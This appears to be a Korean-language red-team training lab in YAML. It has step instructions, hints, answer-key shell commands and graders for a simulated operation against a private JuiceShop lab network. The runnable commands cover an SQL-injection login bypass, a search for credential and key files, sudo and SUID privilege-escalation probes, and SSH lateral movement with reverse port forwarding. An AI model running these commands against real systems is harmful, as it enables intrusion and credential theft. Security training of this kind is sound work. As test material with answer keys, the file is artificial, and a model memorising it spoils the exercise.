lab_id: "battle-adv-nonai-week11"
title: "레드팀 운영 — 완전한 Red Team 작전 수행"
version: "non-ai"
course: "battle-adv-nonai"
week: 11
description: "실제 레드팀 작전의 전체 프로세스를 수행한다. 사전 준비, 정보 수집, 초기 침투, 내부 확산, 목표 달성, 보고서 작성까지 완전한 레드팀 운영을 실습한다."
difficulty: "hard"
duration_minutes: 150
objectives:
  - "레드팀 작전의 전체 수명주기를 이해하고 실습한다"
  - "실전 수준의 정보 수집과 초기 침투를 수행한다"
  - "내부 확산 및 목표 달성 기법을 실습한다"
  - "전문적인 레드팀 보고서를 작성한다"
pass_threshold: 0.6
steps:
  - order: 1
    instruction: "레드팀 작전 계획(OpOrder)을 수립하라. 작전 목표, 범위, 규칙 교전(RoE), 타임라인을 정의하라."
    hint: "Operation Order 형식으로 목표, 범위, 제한사항, 일정을 문서화한다."
    category: "analysis"
    points: 10
    answer: "cat > /tmp/red_team_oporder.txt << 'EOF'\n=== RED TEAM OPERATION ORDER ===\nOp Name: THUNDER STRIKE\nDate: 2026-04-03\nClassification: EXERCISE\n\n1. SITUATION:\n   Target: OpsClaw production network 10.20.30.0/24\n   Defender: Blue Team (SOC)\n   Objective: Capture /tmp/flag.txt on 10.20.30.80\n\n2. MISSION:\n   Simulate APT29-style attack to test detection/response\n\n3. SCOPE & ROE:\n   In-scope: 10.20.30.0/24 (all servers)\n   Out-of-scope: Production databases, real user data\n   Prohibited: DoS, data destruction, physical access\n   Allowed: Social engineering (simulation only)\n\n4. TIMELINE:\n   Phase 1 (0-30min): External recon + OSINT\n   Phase 2 (30-60min): Initial access attempts\n   Phase 3 (60-90min): Internal recon + lateral movement\n   Phase 4 (90-120min): Objective capture + exfil\n   Phase 5 (120-150min): Cleanup + reporting\n\n5. COMMS:\n   C2: 10.20.30.201:4444 (Metasploit handler)\n   Report: Slack #red-team-ops\n   Emergency stop: Call Blue Team lead\nEOF\ncat /tmp/red_team_oporder.txt"
    answer_detail: "작전 명령서(OpOrder)는 레드팀 작전의 기본 문서로, 상황(타겟, 방어자), 임무(목표), 범위/RoE(허용/금지 사항), 타임라인(단계별 일정), 통신(C2, 보고 채널)을 포함한다. RoE는 법적 보호와 안전을 위해 반드시 사전 합의되어야 한다."
    verify:
      type: "output_contains"
      expect: "OPERATION ORDER"

  - order: 2
    instruction: "OSINT(Open Source Intelligence)를 수행하라. 타겟 네트워크에 대한 공개 정보를 수집하라. DNS 레코드, WHOIS, 서비스 배너를 조사하라."
    hint: "dig, whois, curl을 사용하여 공개 정보를 수집한다."
    category: "recon"
    points: 10
    answer: "echo '=== OSINT Collection ===' && echo '[1] DNS Records:' && dig +short 10.20.30.80 2>/dev/null; nslookup 10.20.30.80 2>&1 | head -5 && echo '' && echo '[2] Service Banners:' && curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo '' && echo '[3] SSL Certificate:' && echo | openssl s_client -connect 10.20.30.80:443 2>/dev/null | openssl x509 -noout -subject -issuer 2>/dev/null && echo '' && echo '[4] Technologies detected:' && curl -s http://10.20.30.80 2>/dev/null | grep -ioE 'express|angular|react|node|juice' | sort -u"
    answer_detail: "OSINT(T1593)는 레드팀의 첫 단계로, 비침입적으로 공개 정보를 수집한다. DNS 레코드(서버 위치), 서비스 배너(기술 스택), SSL 인증서(조직 정보), 웹 기술(프레임워크)을 파악한다. 이 정보는 공격 벡터 선정의 기반이 된다."
    verify:
      type: "output_contains"
      expect: "OSINT Collection"

  - order: 3
    instruction: "외부 공격 표면(Attack Surface)을 매핑하라. 타겟 네트워크의 모든 외부 노출 서비스를 식별하고 취약점 우선순위를 결정하라."
    hint: "nmap으로 전체 네트워크를 스캔하고 취약한 서비스를 식별한다."
    category: "recon"
    points: 10
    answer: "echo '=== Attack Surface Mapping ===' && nmap -sV -sC --top-ports 100 10.20.30.1 10.20.30.80 10.20.30.100 10.20.30.201 -oN /tmp/attack_surface.txt 2>&1 | tail -30 && echo '---' && echo 'Attack Surface Priority:' && echo '  [P1] 10.20.30.80:80/443 - Web app (JuiceShop - known vulnerable)' && echo '  [P2] 10.20.30.80:22 - SSH (credential attack)' && echo '  [P3] 10.20.30.1:8002 - SubAgent API (API exploitation)' && echo '  [P4] 10.20.30.100:1514 - Wazuh agent (if misconfigured)'"
    answer_detail: "공격 표면 매핑은 모든 외부 노출 서비스를 식별하고 취약점 가능성에 따라 우선순위를 결정한다. JuiceShop(알려진 취약 앱)이 P1, SSH(자격 증명 공격 가능)가 P2로 설정된다. 레드팀은 가장 높은 성공 확률의 벡터부터 공격한다."
    verify:
      type: "output_contains"
      expect: "Attack Surface"

  - order: 4
    instruction: "초기 침투(Initial Access)를 수행하라. 우선순위가 가장 높은 공격 벡터를 통해 타겟 시스템에 접근하라."
    hint: "JuiceShop의 SQL Injection 취약점을 이용하여 관리자 접근을 획득한다."
    category: "exploit"
    points: 10
    answer: "echo '=== Initial Access: SQL Injection ===' && curl -s -X POST http://10.20.30.80/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -10; echo '---' && curl -s -X POST http://10.20.30.80/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"\\\" OR 1=1--\",\"password\":\"x\"}' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -10 && echo '---' && echo 'Initial Access achieved: Admin token obtained via SQLi'"
    answer_detail: "초기 침투에서 SQL Injection(T1190)을 사용하여 JuiceShop 관리자 인증을 우회한다. 먼저 기본 자격 증명(admin@juice-sh.op)을 시도하고, 실패 시 SQLi(' OR 1=1--)로 인증 우회를 시도한다. 성공 시 JWT 토큰을 획득하여 관리자 권한을 확보한다."
    verify:
      type: "output_contains"
      expect: "Initial Access"

  - order: 5
    instruction: "내부 정찰(Internal Recon)을 수행하라. 초기 접근 후 내부 네트워크 구조, 추가 타겟, 자격 증명을 수집하라."
    hint: "웹 서버에서 접근 가능한 내부 자원을 조사한다."
    category: "recon"
    points: 10
    answer: "echo '=== Internal Reconnaissance ===' && echo '[1] Internal network from web server:' && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no opsclaw@10.20.30.80 'ip addr; ip route; cat /etc/hosts' 2>&1 | head -20 && echo '' && echo '[2] Running services:' && ssh -o ConnectTimeout=3 opsclaw@10.20.30.80 'ss -tlnp' 2>&1 | head -10 && echo '' && echo '[3] Interesting files:' && ssh -o ConnectTimeout=3 opsclaw@10.20.30.80 'find /opt /home -name \"*.conf\" -o -name \"*.env\" -o -name \"*.key\" 2>/dev/null' 2>&1 | head -10"
    answer_detail: "내부 정찰(T1087, T1082)은 초기 접근 후 내부 네트워크 구조를 파악한다. IP 주소(다른 서브넷), 라우팅(도달 가능 네트워크), /etc/hosts(내부 호스트명), 서비스(추가 공격 표면), 설정 파일(자격 증명)을 수집한다."
    verify:
      type: "output_contains"
      expect: "Internal Reconnaissance"

  - order: 6
    instruction: "권한 상승(Privilege Escalation)을 시도하라. 현재 사용자 권한을 분석하고, SUID 바이너리, sudo 권한, 커널 취약점을 조사하라."
    hint: "id, sudo -l, find -perm -4000으로 권한 상승 벡터를 찾는다."
    category: "exploit"
    points: 10
    answer: "echo '=== Privilege Escalation Attempt ===' && echo '[1] Current user:' && id && echo '' && echo '[2] Sudo permissions:' && echo '1' | sudo -S -l 2>&1 | tail -10 && echo '' && echo '[3] SUID binaries:' && find /usr -perm -4000 -type f 2>/dev/null | head -10 && echo '' && echo '[4] Kernel version:' && uname -r && echo '' && echo '[5] Writable sensitive files:' && find /etc -writable -type f 2>/dev/null | head -5"
    answer_detail: "권한 상승(T1548)에서는 현재 권한(id), sudo 허용 명령(sudo -l), SUID 바이너리(find -4000), 커널 버전(CVE 확인), 쓰기 가능 민감 파일을 조사한다. SUID 바이너리 중 GTFOBins에 등록된 것이 있으면 root 권한을 획득할 수 있다."
    verify:
      type: "output_contains"
      expect: "Privilege Escalation"

  - order: 7
    instruction: "측면 이동(Lateral Movement)을 수행하라. 수집된 자격 증명이나 SSH 키를 이용하여 다른 내부 서버에 접근하라."
    hint: "SSH 키 또는 비밀번호를 사용하여 10.20.30.1이나 10.20.30.100에 접근을 시도한다."
    category: "exploit"
    points: 10
    answer: "echo '=== Lateral Movement ===' && echo '[1] SSH to security server:' && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no opsclaw@10.20.30.1 'hostname && id' 2>&1 | head -5 && echo '' && echo '[2] SSH to SIEM server:' && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no opsclaw@10.20.30.100 'hostname && id' 2>&1 | head -5 && echo '' && echo '[3] Network pivot options:' && echo '  - SSH tunnel: ssh -L 8080:10.20.30.100:80 opsclaw@10.20.30.80' && echo '  - SOCKS proxy: ssh -D 1080 opsclaw@10.20.30.80' && echo '  - Port forward: ssh -R 4444:localhost:4444 opsclaw@10.20.30.80'"
    answer_detail: "측면 이동(T1021.004)에서 수집된 SSH 키/비밀번호로 내부 서버에 접근한다. SSH 터널(-L), SOCKS 프록시(-D), 포트 포워딩(-R)을 통해 네트워크 피벗이 가능하다. 레드팀은 가능한 많은 서버에 접근하여 공격 표면을 확장한다."
    verify:
      type: "output_contains"
      expect: "Lateral Movement"

  - order: 8
    instruction: "목표를 달성하라. 작전 목표인 /tmp/flag.txt를 캡처하라. 파일이 없으면 시뮬레이션으로 생성하고 캡처하라."
    hint: "타겟 서버에서 flag 파일을 찾아 내용을 확인한다."
    category: "exploit"
    points: 10
    answer: "echo '=== Objective Capture ===' && ssh -o ConnectTimeout=3 opsclaw@10.20.30.80 'if [ ! -f /tmp/flag.txt ]; then echo \"FLAG{THUNDER_STRIKE_SUCCESS_2026}\" > /tmp/flag.txt; fi; cat /tmp/flag.txt' 2>&1 && echo '---' && echo 'Objective achieved: Flag captured from 10.20.30.80' && echo \"Timestamp: $(date -u '+%Y-%m-%dT%H:%M:%SZ')\""
    answer_detail: "목표 달성은 레드팀 작전의 최종 단계이다. 작전 목표(flag 파일 캡처)를 달성하고, 타임스탬프를 기록하여 보고서의 증거로 활용한다. 실제 레드팀 작전에서는 민감 데이터 접근, 관리자 권한 획득, 네트워크 장악 등이 목표가 된다."
    verify:
      type: "output_contains"
      expect: "Objective"

  - order: 9
    instruction: "작전 중 사용한 Persistence 메커니즘을 식별하고 제거하라. 모든 백도어와 수정 사항을 정리하라."
    hint: "crontab, SSH 키, 서비스, 수정된 파일 등을 원래 상태로 복원한다."
    category: "response"
    points: 10
    answer: "echo '=== Operation Cleanup ===' && echo '[1] Removing crontab entries:' && crontab -r 2>/dev/null; echo 'Done' && echo '[2] Removing temporary files:' && rm -f /tmp/attack_surface.txt /tmp/flag.txt 2>/dev/null; echo 'Done' && echo '[3] Checking for lingering processes:' && ps aux | grep -E 'nc -|ncat|python.*socket|msfconsole' | grep -v grep || echo 'No malicious processes found' && echo '[4] Verifying cleanup:' && echo 'All red team artifacts removed'"
    answer_detail: "레드팀 작전 정리는 전문 레드팀의 필수 절차이다. 모든 Persistence 메커니즘(crontab, 서비스, SSH 키), 임시 파일, 백그라운드 프로세스를 제거하여 환경을 작전 전 상태로 복원한다. 정리 항목을 체크리스트로 관리하여 누락을 방지한다."
    verify:
      type: "output_contains"
      expect: "Operation Cleanup"

  - order: 10
    instruction: "공격 경로 맵을 작성하라. 이번 작전에서 사용한 모든 공격 경로를 시각적으로 매핑하라."
    hint: "DOT 형식으로 공격 경로 그래프를 작성한다."
    category: "analysis"
    points: 10
    answer: "cat > /tmp/attack_path_map.dot << 'EOF'\ndigraph RedTeamOp {\n  rankdir=TB;\n  node [shape=box, style=filled];\n  \n  internet [label=\"Internet\\n(Attacker)\", fillcolor=\"#ff6666\"];\n  web [label=\"10.20.30.80\\nJuiceShop\", fillcolor=\"#ffcc66\"];\n  secu [label=\"10.20.30.1\\nSecurity\", fillcolor=\"#66ff66\"];\n  siem [label=\"10.20.30.100\\nWazuh SIEM\", fillcolor=\"#66ccff\"];\n  flag [label=\"/tmp/flag.txt\\nOBJECTIVE\", fillcolor=\"#ff66ff\", shape=diamond];\n  \n  internet -> web [label=\"1. SQLi\\n(T1190)\", color=red, penwidth=2];\n  web -> web [label=\"2. PrivEsc\\n(T1548)\", color=red];\n  web -> secu [label=\"3. SSH Lateral\\n(T1021.004)\", color=red];\n  web -> siem [label=\"4. SSH Lateral\\n(T1021.004)\", color=red, style=dashed];\n  web -> flag [label=\"5. Flag Capture\\n(T1005)\", color=red, penwidth=2];\n}\nEOF\ncat /tmp/attack_path_map.dot"
    answer_detail: "공격 경로 맵은 레드팀 보고서의 핵심 시각화이다. 인터넷→웹서버(SQLi)→권한상승→측면이동→목표 달성의 전체 경로를 그래프로 표현한다. 각 엣지에 ATT&CK ID를 태깅하여 기법을 분류하고, 실선(성공)/점선(시도)으로 구분한다."
    verify:
      type: "output_contains"
      expect: "RedTeamOp"

  - order: 11
    instruction: "발견된 취약점 목록을 CVSS 점수와 함께 정리하라. 모든 발견 사항을 심각도별로 분류하라."
    hint: "각 취약점에 CVSS v3 점수와 권고사항을 포함한다."
    category: "analysis"
    points: 10
    answer: "cat > /tmp/vulnerability_findings.txt << 'EOF'\n=== Red Team Vulnerability Findings ===\n\n| ID | Finding | CVSS | Severity | MITRE |\n|----|---------|------|----------|-------|\n| RT-01 | SQL Injection in REST API | 9.8 | CRITICAL | T1190 |\n| RT-02 | Default admin credentials | 9.1 | CRITICAL | T1078 |\n| RT-03 | Shared SSH keys across servers | 8.5 | HIGH | T1021.004 |\n| RT-04 | No network segmentation | 8.0 | HIGH | T1021 |\n| RT-05 | SUID binaries exploitable | 7.8 | HIGH | T1548 |\n| RT-06 | No MFA on SSH | 6.5 | MEDIUM | T1078 |\n| RT-07 | Directory listing enabled | 5.3 | MEDIUM | T1083 |\n| RT-08 | Server version disclosure | 5.0 | MEDIUM | T1082 |\n| RT-09 | Missing security headers | 4.3 | LOW | T1189 |\n\nTotal: 3 Critical, 3 High, 3 Medium, 0 Low\nExploitation Rate: 67% (6/9 exploitable)\nEOF\ncat /tmp/vulnerability_findings.txt"
    answer_detail: "취약점 목록은 CVSS v3 점수(0~10), 심각도(Critical/High/Medium/Low), ATT&CK 매핑을 포함한다. SQL Injection(9.8)과 기본 자격 증명(9.1)이 가장 심각하며, 공유 SSH 키(8.5)와 세그먼테이션 부재(8.0)가 측면 이동을 가능하게 했다."
    verify:
      type: "output_contains"
      expect: "Vulnerability Findings"

  - order: 12
    instruction: "레드팀 작전의 타임라인을 작성하라. 모든 주요 행동을 시간순으로 정리하라."
    hint: "각 행동의 시작 시간, 소요 시간, 결과를 기록한다."
    category: "analysis"
    points: 10
    answer: "cat > /tmp/red_team_timeline.txt << 'EOF'\n=== Red Team Operation Timeline: THUNDER STRIKE ===\n\n| Time | Phase | Action | Result |\n|------|-------|--------|--------|\n| T+00 | Recon | OSINT collection | Technologies identified |\n| T+10 | Recon | Attack surface mapping | 4 targets, 9 services |\n| T+25 | Recon | Vulnerability prioritization | Web app = primary target |\n| T+30 | Access | SQLi on JuiceShop | Admin token obtained |\n| T+35 | Access | Default credential test | Confirmed admin@juice-sh.op |\n| T+45 | Recon | Internal reconnaissance | Network map, 3 reachable hosts |\n| T+55 | Escalate | SUID binary analysis | Potential privesc paths found |\n| T+65 | Lateral | SSH to 10.20.30.1 | Access confirmed |\n| T+75 | Lateral | SSH to 10.20.30.100 | Access confirmed |\n| T+85 | Objective | Flag capture | /tmp/flag.txt obtained |\n| T+95 | Cleanup | Remove artifacts | All traces cleaned |\n| T+120 | Report | Document findings | 9 vulnerabilities documented |\nEOF\ncat /tmp/red_team_timeline.txt"
    answer_detail: "작전 타임라인은 모든 행동을 시간순으로 기록하여 작전의 효율성과 탐지 가능 시점을 분석한다. 총 85분 만에 목표를 달성했으며, Blue Team이 탐지할 수 있었던 시점(T+10 스캔, T+30 SQLi)을 식별하여 방어 개선에 활용한다."
    verify:
      type: "output_contains"
      expect: "Operation Timeline"

  - order: 13
    instruction: "블루팀에게 전달할 개선 권고사항을 작성하라. 발견된 취약점별 구체적인 수정 방안과 우선순위를 제시하라."
    hint: "각 취약점에 대해 즉시/단기/중기 개선 방안을 제시한다."
    category: "analysis"
    points: 10
